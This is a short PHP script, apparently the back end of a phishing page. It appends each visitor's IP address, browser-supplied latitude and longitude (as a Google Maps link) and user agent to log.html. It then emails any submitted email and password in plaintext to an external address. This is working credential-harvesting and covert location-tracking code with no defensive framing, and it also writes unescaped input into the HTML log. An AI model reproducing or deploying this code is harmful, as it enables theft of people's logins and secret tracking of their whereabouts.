<?php
$file = fopen("log.html", "a");
$date = date("d-m-Y H:i:s") . " (GMT)";
$ip = $_SERVER["REMOTE_ADDR"];
$lat = $_GET["lat"];
$long = $_GET["long"];
$url = "https://www.google.com/maps/search/?api=1&query=" . $lat . "%2C" . $long;
$agent = $_GET["agent"];
$data =  "<pre>Datetime: " . $date . "\nIP: " . $ip . "\nLocation: " . "<a href=" . $url . " target='_blank'>Click Here</a>" . "\nUser-Agent: " . $agent . "</pre>\n\n";
fwrite($file, $data);
fclose($file);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $to = "sopoj96367@operades.com";
    $subject = "Nuevo Registro en la App";

    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']); 
    $message = "Datos del formulario:\n";
    $message .= "Email/Usuario: " . $email . "\n";
    $message .= "Contraseña: " . $password . "\n"; // No recomendado para datos sensibles en producción

    $headers = "From: sopoj96367@operades.com\r\n";
    $headers .= "Reply-To: " . $email . "\r\n";

    // Enviar el correo
    if (mail($to, $subject, $message, $headers)) {
        echo "Formulario enviado correctamente.";
    } else {
        echo "Error al enviar el formulario.";
    }
}

?>
